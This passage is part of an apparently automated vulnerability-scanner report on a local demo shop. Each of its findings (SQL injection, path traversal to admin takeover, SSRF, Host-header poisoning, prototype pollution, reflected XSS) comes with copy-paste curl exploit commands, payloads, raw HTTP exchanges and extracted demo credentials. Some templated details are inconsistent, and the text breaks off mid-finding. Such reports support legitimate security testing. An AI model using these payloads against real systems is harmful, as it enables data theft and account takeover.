**Impact:** Full database read access is demonstrated: an attacker can enumerate schemas and exfiltrate any stored data (credentials, personal data, tokens), and often write or destroy records. Where credential data is stored, SQLi directly escalates to authenticated account takeover, as proven above when the extracted credentials were replayed against the login endpoint. On many stacks this further escalates to remote code execution through database features.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 9. [CRITICAL] Possible boolean-based SQL injection in 'sku'

- **Class:** SQL Injection
- **URL:** http://127.0.0.1:8081/stock
- **Injection point:** `GET /stock -> request parameter 'sku'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-89
- **Module:** sqli

**Description.** Responses to '1'='1 vs '1'='2 payloads in 'sku' differ in content and/or status code, suggesting the input reaches a SQL boolean context.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
# Reconstructed from behaviour: the parameter is concatenated into a
# SQL WHERE clause; crafting TRUE/FALSE conditions changes the result set.
query = "SELECT ... WHERE col = '" + request_input + "'"   # injectable
rows = db.execute(query)
```

**Impact.** Full database read access is demonstrated: an attacker can enumerate schemas and exfiltrate any stored data (credentials, personal data, tokens), and often write or destroy records. Where credential data is stored, SQLi directly escalates to authenticated account takeover, as proven above when the extracted credentials were replayed against the login endpoint. On many stacks this further escalates to remote code execution through database features.

**Detection evidence.**

```
status: base=200 true=200 false=200 | similarity: true~base=1.000 false~base=0.889 true~false=0.889

GET http://127.0.0.1:8081/stock (sku=...' AND '1'='1 / '1'='2)
```

#### Proof of exploitation

The scanner extracted password of user 'administrator' from table 'users' ('S3cret-wizard-pass', SQLite) character-by-character through the boolean-blind oracle, proving arbitrary data extraction from the database The scanner then authenticated as 'administrator' through the application's own login endpoint, proving full account takeover..

**Data extracted from the target by the exploit:**

```
Database: SQLite
Extracted via boolean binary search -- password of user 'administrator' from table 'users': S3cret-wizard-pass
Requests used: bounded binary search (128 requests)
ACCOUNT TAKEOVER: logged in via http://127.0.0.1:8081/login as 'administrator' -- authenticated markers in response: log out, logout, my account
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'sku=Widget'\'' AND '\''1'\''='\''1' 'http://127.0.0.1:8081/stock'
```

**Raw HTTP exchange:**

```http
GET /stock?sku=Widget%27%20AND%20%271%27%3D%271 HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:31 GMT
server: uvicorn
content-length: 121
content-type: text/html; charset=utf-8

<html><body>Welcome back, administrator! <a href='/my-account'>My account</a> <a href='/logout'>Log out</a></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/stock in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: Widget' AND '1'='1
4. Observe that the extracted database data appears in the response.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Use parameterized queries; confirm manually with sqlmap.

#### Bounty submission draft

**Title:** Possible boolean-based SQL injection in 'sku'

**Severity:** critical (CWE-89)

**Asset:** http://127.0.0.1:8081/stock

**Summary:** Responses to '1'='1 vs '1'='2 payloads in 'sku' differ in content and/or status code, suggesting the input reaches a SQL boolean context.

**Impact:** Full database read access is demonstrated: an attacker can enumerate schemas and exfiltrate any stored data (credentials, personal data, tokens), and often write or destroy records. Where credential data is stored, SQLi directly escalates to authenticated account takeover, as proven above when the extracted credentials were replayed against the login endpoint. On many stacks this further escalates to remote code execution through database features.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 10. [CRITICAL] Possible boolean-based SQL injection in 'cookie:TrackingId'

- **Class:** SQL Injection
- **URL:** http://127.0.0.1:8081/track
- **Injection point:** `GET /track -> cookie 'TrackingId'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-89
- **Module:** sqli

**Description.** Responses to '1'='1 vs '1'='2 payloads in 'cookie:TrackingId' differ in content and/or status code, suggesting the input reaches a SQL boolean context.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
# Reconstructed from behaviour: the parameter is concatenated into a
# SQL WHERE clause; crafting TRUE/FALSE conditions changes the result set.
query = "SELECT ... WHERE col = '" + request_input + "'"   # injectable
rows = db.execute(query)
```

**Impact.** Full database read access is demonstrated: an attacker can enumerate schemas and exfiltrate any stored data (credentials, personal data, tokens), and often write or destroy records. Where credential data is stored, SQLi directly escalates to authenticated account takeover, as proven above when the extracted credentials were replayed against the login endpoint. On many stacks this further escalates to remote code execution through database features.

**Detection evidence.**

```
status: base=200 true=200 false=200 | similarity: true~base=1.000 false~base=0.604 true~false=0.660

GET http://127.0.0.1:8081/track (cookie:TrackingId=...' AND '1'='1 / '1'='2)
```

#### Proof of exploitation

The scanner extracted password of user 'administrator' from table 'users' ('S3cret-wizard-pass', SQLite) character-by-character through the boolean-blind oracle, proving arbitrary data extraction from the database The scanner then authenticated as 'administrator' through the application's own login endpoint, proving full account takeover..

**Data extracted from the target by the exploit:**

```
Database: SQLite
Extracted via boolean binary search -- password of user 'administrator' from table 'users': S3cret-wizard-pass
Requests used: bounded binary search (128 requests)
ACCOUNT TAKEOVER: logged in via http://127.0.0.1:8081/login as 'administrator' -- authenticated markers in response: log out, logout, my account
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -H 'Cookie: TrackingId=bhtid-demo-session-0001'\'' AND '\''1'\''='\''1' -G 'http://127.0.0.1:8081/track'
```

**Raw HTTP exchange:**

```http
GET /track HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*
Cookie: TrackingId=bhtid-demo-session-0001' AND '1'='1


HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:34 GMT
server: uvicorn
content-length: 121
content-type: text/html; charset=utf-8

<html><body>Welcome back, administrator! <a href='/my-account'>My account</a> <a href='/logout'>Log out</a></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/track in a browser or HTTP client.
2. Send the request again with the cookie 'TrackingId' set to the exploit payload.
3. Payload: bhtid-demo-session-0001' AND '1'='1
4. Observe that the extracted database data appears in the response.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Use parameterized queries; confirm manually with sqlmap.

#### Bounty submission draft

**Title:** Possible boolean-based SQL injection in 'cookie:TrackingId'

**Severity:** critical (CWE-89)

**Asset:** http://127.0.0.1:8081/track

**Summary:** Responses to '1'='1 vs '1'='2 payloads in 'cookie:TrackingId' differ in content and/or status code, suggesting the input reaches a SQL boolean context.

**Impact:** Full database read access is demonstrated: an attacker can enumerate schemas and exfiltrate any stored data (credentials, personal data, tokens), and often write or destroy records. Where credential data is stored, SQLi directly escalates to authenticated account takeover, as proven above when the extracted credentials were replayed against the login endpoint. On many stacks this further escalates to remote code execution through database features.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 11. [CRITICAL] Chained attack: path traversal -> credential disclosure -> account takeover

- **Class:** Privilege Escalation
- **URL:** http://127.0.0.1:8081/login
- **Injection point:** `GET /login`
- **Status:** VERIFIED ✅ EXPLOITED
- **Module:** exploit-chainer
- **Attack chain:** `traversal-to-takeover` -- composed from 1 finding(s)

**Chain narrative.** Path traversal / LFI in 'name' -> Chained attack: path traversal -> credential disclosure -> account takeover

**Description.** The verified path-traversal primitive was used to read the application's own configuration (.env); the credential material it contained authenticated successfully against the application's login endpoint. This is a full account takeover assembled entirely from one file-read bug.

**Impact.** Complete application compromise starting from a single path-traversal bug: the attacker reads the config, logs in as the account whose credentials were stored there, and inherits that account's privileges (often admin).

**Detection evidence.**

```
1) traversal read '.env': config file '.env' read through the traversal primitive (2 credential-bearing assignment(s) visible)
2) credential pair (SMTP_PASSWORD=<redacted>) submitted to http://127.0.0.1:8081/login
3) login verified against a failed-credential baseline: authenticated markers in response: log out, logout, my account
```

#### Proof of exploitation

Attack chain assembled from independently verified findings: Path traversal / LFI in 'name'. Every link's raw evidence appears in its parent finding's report section; this finding carries the combined impact.

**Data extracted from the target by the exploit:**

```
config file '.env' read through the traversal primitive (2 credential-bearing assignment(s) visible)
    SMTP_USERNAME = administrator
    SMTP_PASSWORD = S3cret-wizard-pass
login succeeded: authenticated markers in response: log out, logout, my account
```

**Reproduce (copy-paste):**

```bash
curl -sG 'http://127.0.0.1:8081/file' --data-urlencode 'name=../../../../../../.env'
```

**Raw HTTP exchange:**

```http
HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:34 GMT
server: uvicorn
content-length: 121
content-type: text/html; charset=utf-8

<html><body>Welcome back, administrator! <a href='/my-account'>My account</a> <a href='/logout'>Log out</a></body></html>

HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:34 GMT
server: uvicorn
content-length: 121
content-type: text/html; charset=utf-8

<html><body>Welcome back, administrator! <a href='/my-account'>My account</a> <a href='/logout'>Log out</a></body></html>
```

**Manual reproduction steps:**

1. 1. Run: curl -sG 'http://127.0.0.1:8081/file' --data-urlencode 'name=../../../../../../.env'
2. 2. Observe the credential assignments in the response.
3. 3. Submit the leaked credential pair to http://127.0.0.1:8081/login.
4. 4. The application opens an authenticated session (compare with a failed login).

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Fix the traversal; never store login credentials in web-reachable files; rotate the exposed credential; invalidate sessions and review audit logs for use of this account.

#### Bounty submission draft

**Title:** Chained attack: path traversal -> credential disclosure -> account takeover

**Severity:** critical

**Asset:** http://127.0.0.1:8081/login

**Summary:** The verified path-traversal primitive was used to read the application's own configuration (.env); the credential material it contained authenticated successfully against the application's login endpoint. This is a full account takeover assembled entirely from one file-read bug.

**Impact:** Complete application compromise starting from a single path-traversal bug: the attacker reads the config, logs in as the account whose credentials were stored there, and inherits that account's privileges (often admin).

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 12. [HIGH] Exposed API documentation: GraphQL endpoint

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/graphql
- **Injection point:** `GET /graphql`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** api-discovery

**Description.** An API description endpoint is publicly accessible. It exposes the entire API surface (endpoints, parameters, schemas, and often internal/undocumented routes) -- a treasure map for the active phase.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/graphql -> 200; content-type=application/json; body[:200]='{"errors": [{"message": "not supported in demo"}]}\n--- introspection ---\n{"data": {"__schema": {"types": [{"name": "Query"}, {"name": "User"}, {"name": "Role"}, {"name": "Session"}, {"name": "Mutation'
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Restrict API doc endpoints to authenticated / internal users.

#### Bounty submission draft

**Title:** Exposed API documentation: GraphQL endpoint

**Severity:** high (CWE-200)

**Asset:** http://127.0.0.1:8081/graphql

**Summary:** An API description endpoint is publicly accessible. It exposes the entire API surface (endpoints, parameters, schemas, and often internal/undocumented routes) -- a treasure map for the active phase.

**Impact:** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 13. [HIGH] Risky HTTP methods enabled: PUT, DELETE, TRACE

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-650
- **Module:** http-methods

**Description.** The server advertises HTTP methods that expand the attack surface. Each can be abused as noted below; verify whether they are actually functional (the Allow header is sometimes stale) and gated by authentication.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
- PUT: arbitrary file upload (web shell)
- DELETE: arbitrary file deletion
- TRACE: Cross-Site Tracing (XST)
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Disable WebDAV unless required; gate PUT/DELETE/CONNECT behind strong auth; disable TRACE entirely.

#### Bounty submission draft

**Title:** Risky HTTP methods enabled: PUT, DELETE, TRACE

**Severity:** high (CWE-650)

**Asset:** http://127.0.0.1:8081/

**Summary:** The server advertises HTTP methods that expand the attack surface. Each can be abused as noted below; verify whether they are actually functional (the Allow header is sometimes stale) and gated by authentication.

**Impact:** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 14. [HIGH] Possible hardcoded secret: Stripe secret key

- **Class:** Cryptographic Issue (secrets / JWT / weak hashing)
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-798
- **Module:** secrets

**Description.** A credential-like string was found in client-delivered content.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Stripe secret key match: 'sk_live_0123456789abcdefghijklmn'
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Rotate the exposed secret and keep secrets server-side, never in client code.

#### Bounty submission draft

**Title:** Possible hardcoded secret: Stripe secret key

**Severity:** high (CWE-798)

**Asset:** http://127.0.0.1:8081/

**Summary:** A credential-like string was found in client-delivered content.

**Impact:** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 15. [HIGH] Possible hardcoded secret: Generic API key assignment

- **Class:** Cryptographic Issue (secrets / JWT / weak hashing)
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-798
- **Module:** secrets

**Description.** A credential-like string was found in client-delivered content.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Generic API key assignment match: 'api_key = "[REDACTED:aws_access_key]"'
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Rotate the exposed secret and keep secrets server-side, never in client code.

#### Bounty submission draft

**Title:** Possible hardcoded secret: Generic API key assignment

**Severity:** high (CWE-798)

**Asset:** http://127.0.0.1:8081/

**Summary:** A credential-like string was found in client-delivered content.

**Impact:** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 16. [HIGH] Host-header reflection into absolute url / json string in body via Host

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/reset
- **Injection point:** `GET /reset`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-644
- **Module:** host-header-poison

**Description.** Supplying Host: bhhost-wh2858hl.evil.example makes the application use that host in absolute URL / JSON string in body. The reflection reproduced on a repeat request, ruling out one-off cache artifacts.

**Impact.** Password-reset links, canonical URLs, redirects or cached variants are built from an attacker-controlled header. A crafted request poisons the URL a victim receives -- the canonical password-reset-poisoning and web-cache-poisoning primitive.

**Detection evidence.**

```
Host: bhhost-wh2858hl.evil.example -> reflected in absolute URL / JSON string in body
Location: (none)
body excerpt: <html><body>Check your email. Reset link: <a href="http://bhhost-wh2858hl.evil.example/reset-confirm?token=abc123">reset password</a></body></html>

GET http://127.0.0.1:8081/reset with Host: bhhost-wh2858hl.evil.example
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Build absolute URLs from server-side configuration, never from client-supplied Host/X-Forwarded-Host; allowlist the expected host at the proxy; strip inbound X-Forwarded-* from untrusted sources.

#### Bounty submission draft

**Title:** Host-header reflection into absolute url / json string in body via Host

**Severity:** high (CWE-644)

**Asset:** http://127.0.0.1:8081/reset

**Summary:** Supplying Host: bhhost-wh2858hl.evil.example makes the application use that host in absolute URL / JSON string in body. The reflection reproduced on a repeat request, ruling out one-off cache artifacts.

**Impact:** Password-reset links, canonical URLs, redirects or cached variants are built from an attacker-controlled header. A crafted request poisons the URL a victim receives -- the canonical password-reset-poisoning and web-cache-poisoning primitive.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 17. [HIGH] Server-side prototype-pollution sink reached via JSON body at http://127.0.0.1:8081/api/merge

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/api/merge
- **Injection point:** `POST /api/merge`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-1321
- **Module:** prototype-pollution

**Description.** A JSON body containing a __proto__ key caused the injected key/value pair to surface in the application's response, indicating a recursive merge that copies __proto__ into server-side objects. Depending on gadgets this yields auth bypass, RCE or denial of service.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
POST {"__proto__": {"bhcbdecrwi": "ppyvvf3igd"}} -> response contains injected 'bhcbdecrwi': {"theme": "light", "bhcbdecrwi": "ppyvvf3igd"}

POST http://127.0.0.1:8081/api/merge (application/json) body: {"__proto__": {"bhcbdecrwi": "ppyvvf3igd"}}
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -X POST --data 'payload=%7B%7D' 'http://127.0.0.1:8081/api/merge'
```

**Raw HTTP exchange:**

```http
POST /api/merge HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

payload=%7B%7D
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/api/merge in a browser or HTTP client.
2. Send the request again with the body parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Reject __proto__/constructor keys in JSON parsing; use Object.create(null)-based maps; upgrade merge libraries.

#### Bounty submission draft

**Title:** Server-side prototype-pollution sink reached via JSON body at http://127.0.0.1:8081/api/merge

**Severity:** high (CWE-1321)

**Asset:** http://127.0.0.1:8081/api/merge

**Summary:** A JSON body containing a __proto__ key caused the injected key/value pair to surface in the application's response, indicating a recursive merge that copies __proto__ into server-side objects. Depending on gadgets this yields auth bypass, RCE or denial of service.

**Impact:** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 18. [HIGH] Possible SSRF via 'url'

- **Class:** Server-Side Request Forgery (SSRF)
- **URL:** http://127.0.0.1:8081/fetch
- **Injection point:** `GET /fetch -> request parameter 'url'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-918
- **Module:** ssrf

**Description.** 'url' appears to trigger a server-side fetch: supplying an internal URL produced a connection-level error surfaced from the server.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
# Reconstructed from behaviour: the server fetches the URL supplied in the
# parameter and returns/uses the response -- loopback addresses included.
resp = urllib.request.urlopen(request_input)   # SSRF: scheme/host unfiltered
body = resp.read()
```

**Impact.** The application fetches attacker-chosen URLs server-side and returns the body. An attacker can pivot into the internal network: read internal-only APIs and admin panels, interact with databases behind the firewall, and -- on cloud hosts -- retrieve instance credentials from metadata services. This is the classic path from web RCE-adjacent bug to full network compromise.

**Detection evidence.**

```
Set url=http://127.0.0.1:1/; response contained a server-side connection error.

GET http://127.0.0.1:8081/fetch (url=http://127.0.0.1:1/)
```

#### Proof of exploitation

The scanner made the target fetch an internal loopback URL (http://127.0.0.1:8081/) and return the response body to us -- the page fingerprint 'Demo Shop' came back from inside the server. SSRF is demonstrated with actual content exfiltration, not just an inferred connection error.

**Data extracted from the target by the exploit:**

```
Internal URL fetched server-side: http://127.0.0.1:8081/
Fingerprint of internal response found in our HTTP response: 'Demo Shop'
Same primitive reaches any internal service reachable from the server (databases, admin panels, metadata services).
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'url=http://127.0.0.1:8081/' 'http://127.0.0.1:8081/fetch'
```

**Raw HTTP exchange:**

```http
GET /fetch?url=http%3A%2F%2F127.0.0.1%3A8081%2F HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:31 GMT
server: uvicorn
content-length: 1574
content-type: text/plain; charset=utf-8

<html><head><title>Demo Shop</title></head><body>
    <h1>Demo</h1>
    <!-- config -->
    <script>const api_key = "[REDACTED:aws_access_key]"; var stripe="sk_live_0123456789abcdefghijklmn";</script>
    <script src="/static/app.js"></script>
    <a href="/search?q=hello">search</a>
    <a href="/item?id=1">item 1</a>
    <a href="/product?id=1">product 1</a>
    <a href="/filter?category=Accessories">accessories</a>
    <a href="/track">track</a>
    <a href="/stock?sku=Widget">stock</a>
    <a href="/go?url=/home">home</a>
    <a href="/file?name=readme.txt">readme</a>
    <a href="/ping?host=127.0.0.1">ping</a>
    <a href="/fetch?url=/status">fetch</a>
    <a href="/admin">admin</a>
    <a href="/reset">reset password</a>
    <a href="/jwt">jwt login</a>
    <a href="/merge?theme=dark">theme settings</a>
    <a href="mailto:admin@example.com">contact</a>
    <form method="post" action="/transfer">
      <input name="amount" value="10"/><input name="to" value="bob"/>
      <button>send</button>
    </form>
    <form method="post" action="/login">
      <input name="username"/><input type="password" name="password"/>
    </form>
    <form method="post" action="/login-nosql">
   
... [truncated, 374 more bytes]
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/fetch in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: http://127.0.0.1:8081/
4. Observe that the target's own landing-page content (fingerprint 'Demo Shop') is returned from a loopback address the client cannot reach directly.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Enforce an egress allowlist, block internal ranges/metadata IPs, resolve+validate hosts.

#### Bounty submission draft

**Title:** Possible SSRF via 'url'

**Severity:** high (CWE-918)

**Asset:** http://127.0.0.1:8081/fetch

**Summary:** 'url' appears to trigger a server-side fetch: supplying an internal URL produced a connection-level error surfaced from the server.

**Impact:** The application fetches attacker-chosen URLs server-side and returns the body. An attacker can pivot into the internal network: read internal-only APIs and admin panels, interact with databases behind the firewall, and -- on cloud hosts -- retrieve instance credentials from metadata services. This is the classic path from web RCE-adjacent bug to full network compromise.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 19. [HIGH] Reflected XSS in 'q'

- **Class:** Cross-Site Scripting (XSS)
- **URL:** http://127.0.0.1:8081/search
- **Injection point:** `GET /search -> request parameter 'q'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-79
- **Module:** xss

**Description.** Input from 'q' is reflected without HTML-encoding, allowing script injection.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
<!-- Reconstructed from behaviour: input is echoed into the HTML body
     without contextual encoding, so injected markup/script executes. -->
<p>Results for: <?= request_input ?></p>   <!-- unencoded reflection -->
```

**Impact.** Attackers execute arbitrary JavaScript in your users' browsers under your origin: session-cookie theft (no HttpOnly required for DOM attacks), keylogging, phishing overlays, silent request forgery with the victim's credentials, and wormable payloads in social features. Every user who opens an attacker-crafted link is affected.

**Detection evidence.**

```
Payload '<bhXSS9271>"\'' reflected as raw HTML (<bhXSS9271> present).

GET http://127.0.0.1:8081/search (q=<bhXSS9271>"')

--- response excerpt ---
<html><body>Results for: <bhXSS9271>"'</body></html>
```

